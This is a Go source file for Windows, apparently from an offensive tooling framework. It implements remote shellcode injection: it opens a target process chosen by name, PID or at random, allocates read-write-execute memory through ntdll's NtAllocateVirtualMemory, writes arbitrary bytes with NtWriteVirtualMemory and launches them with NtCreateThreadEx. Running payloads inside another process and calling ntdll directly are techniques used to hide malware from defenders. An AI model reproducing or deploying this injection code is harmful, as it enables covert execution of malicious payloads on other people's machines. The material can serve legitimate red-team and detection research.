//+build windows

package cmd

import (
	"context"
	"fmt"
	"sync/atomic"
	"unsafe"

	"golang.org/x/sys/windows"
)

const secCode = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
	windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
	windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
	windows.PROCESS_DUP_HANDLE | 0x001

var (
	dllNtdll = windows.NewLazySystemDLL("ntdll.dll")

	funcTerminateThread   = dllKernel32.NewProc("TerminateThread")
	funcGetExitCodeThread = dllKernel32.NewProc("GetExitCodeThread")

	funcNtCreateThreadEx        = dllNtdll.NewProc("NtCreateThreadEx")
	funcNtFreeVirtualMemory     = dllNtdll.NewProc("NtFreeVirtualMemory")
	funcNtWriteVirtualMemory    = dllNtdll.NewProc("NtWriteVirtualMemory")
	funcNtAllocateVirtualMemory = dllNtdll.NewProc("NtAllocateVirtualMemory")
)

type base struct {
	loc    uintptr
	once   uint32
	owner  windows.Handle
	cancel context.CancelFunc
	container
}

func (c *Code) wait() {
	var (
		x   = make(chan error)
		err error
	)
	go waitFunc(windows.Handle(c.handle), windows.INFINITE, x)
	select {
	case err = <-x:
	case <-c.ctx.Done():
	}
	if err != nil {
		c.stopWith(err)
		return
	}
	if c.ctx.Err() != nil {
		c.stopWith(c.ctx.Err())
		return
	}
	funcGetExitCodeThread.Call(uintptr(c.handle), uintptr(unsafe.Pointer(&c.exit)))
	atomic.StoreUint32(&c.once, 2)
	if c.handle = 0; c.exit != 0 {
		c.stopWith(&ExitError{Exit: c.exit})
		return
	}
	c.stopWith(nil)
}
func (c *Code) close() {
	if c.owner == 0 {
		return
	}
	if c.loc > 0 {
		freeMemory(c.owner, c.loc)
	}
	windows.Close(windows.Handle(c.handle))
	windows.CloseHandle(c.owner)
	c.handle, c.owner, c.loc = 0, 0, 0
}

// Stop will attempt to terminate the currently running Code thread instance.
// Always returns nil on non-Windows devices.
func (c *Code) Stop() error {
	if c.handle == 0 {
		return nil
	}
	return c.stopWith(c.kill())
}
func (c *Code) kill() error {
	c.exit = exitStopped
	if r, _, err := funcTerminateThread.Call(uintptr(c.handle), uintptr(exitStopped)); r == 0 {
		return err
	}
	return nil
}

// Start will attempt to start the Code thread and will return an errors that occur while starting the Code thread.
// This function will return 'ErrEmptyCommand' if the 'Data' parameter is empty or nil and 'ErrAlreadyStarted'
// if attempting to start a Code thread that already has been started previously. Always returns 'ErrNoWindows'
// on non-Windows devices.
func (c *Code) Start() error {
	if c.Running() || c.handle > 0 {
		return ErrAlreadyStarted
	}
	if len(c.Data) == 0 {
		return ErrEmptyCommand
	}
	if c.ctx == nil {
		c.ctx = context.Background()
	}
	if c.cancel == nil {
		if c.Timeout > 0 {
			c.ctx, c.cancel = context.WithTimeout(c.ctx, c.Timeout)
		} else {
			c.ctx, c.cancel = context.WithCancel(c.ctx)
		}
	}
	var err error
	atomic.StoreUint32(&c.once, 0)
	c.ch = make(chan finished)
	c.owner = windows.CurrentProcess()
	if !c.container.empty() {
		if c.owner, err = c.container.getParent(secCode); err != nil {
			return c.stopWith(err)
		}
	}
	if c.loc, err = allocateMemory(c.owner, uint32(len(c.Data))); err != nil {
		return c.stopWith(err)
	}
	if _, err = writeMemory(c.owner, c.loc, c.Data); err != nil {
		return c.stopWith(err)
	}
	if c.handle, err = createThread(c.owner, c.loc); err != nil {
		return c.stopWith(err)
	}
	go c.wait()
	return nil
}
func (b base) String() string {
	return fmt.Sprintf("0x%X -> 0x%X", b.owner, b.loc)
}

// SetParent will instruct the Process to choose a parent with the supplied process name. If this string is empty,
// this will use the current process (default). This function has no effect if the device is not running Windows.
func (c *Code) SetParent(n string) {
	c.container.clear()
	if len(n) > 0 {
		c.container.name = n
	}
}

// SetParentPID will instruct the Process to choose a parent with the supplied process ID. If this number is
// zero, this will use the current process (default) and if < 0 this Process will choose a parent from a list
// of writable processes. This function has no effect if the device is not running Windows.
func (c *Code) SetParentPID(i int32) {
	c.container.clear()
	if i != 0 {
		c.container.pid = i
	}
}
func (c *Code) stopWith(e error) error {
	if atomic.LoadUint32(&c.once) != 1 {
		s := c.once
		atomic.StoreUint32(&c.once, 1)
		if c.handle > 0 && s != 2 {
			c.kill()
			c.close()
		}
		if s != 2 && c.ctx.Err() != nil && c.exit == 0 {
			c.err = c.ctx.Err()
			c.exit = exitStopped
		}
		close(c.ch)
	}
	c.cancel()
	if c.err == nil && c.ctx.Err() != nil {
		if e != nil {
			c.err = e
			return e
		}
		return nil
	}
	return c.err
}

// SetParentRandom will set instruct the Process to choose a parent from the supplied string list on runtime. If this
// list is empty or nil, there is no limit to the name of the chosen process. This function has no effect if the
// device is not running Windows.
func (c *Code) SetParentRandom(s []string) {
	if len(s) == 0 {
		c.SetParentPID(-1)
	} else {
		c.container.clear()
		c.container.choices = s
	}
}
func freeMemory(h windows.Handle, a uintptr) error {
	var (
		s         uint32
		r, _, err = funcNtFreeVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			uintptr(unsafe.Pointer(&s)), windows.MEM_RELEASE,
		)
	)
	if r > 0 {
		return fmt.Errorf("winapi NtFreeVirtualMemory error: %w", err)
	}
	return nil
}
func createThread(h windows.Handle, a uintptr) (uintptr, error) {
	var (
		t         uintptr
		r, _, err = funcNtCreateThreadEx.Call(
			uintptr(unsafe.Pointer(&t)),
			windows.GENERIC_ALL, 0,
			uintptr(h), a, 0, 0, 0, 0, 0, 0,
		)
	)
	if r > 0 {
		return 0, fmt.Errorf("winapi NtCreateThreadEx error: %w", err)
	}
	return t, nil
}
func allocateMemory(h windows.Handle, s uint32) (uintptr, error) {
	var (
		a         uintptr
		x         = s
		r, _, err = funcNtAllocateVirtualMemory.Call(
			uintptr(h), uintptr(unsafe.Pointer(&a)),
			0, uintptr(unsafe.Pointer(&x)),
			windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE,
		)
	)
	if r > 0 {
		return 0, fmt.Errorf("winapi NtAllocateVirtualMemory error: %w", err)
	}
	return a, nil
}
func writeMemory(h windows.Handle, a uintptr, b []byte) (uint32, error) {
	var (
		s         uint32
		r, _, err = funcNtWriteVirtualMemory.Call(
			uintptr(h), uintptr(a),
			uintptr(unsafe.Pointer(&b[0])),
			uintptr(len(b)),
			uintptr(unsafe.Pointer(&s)),
		)
	)
	if r > 0 {
		return 0, fmt.Errorf("winapi NtWriteVirtualMemory error: %w", err)
	}
	return s, nil
}
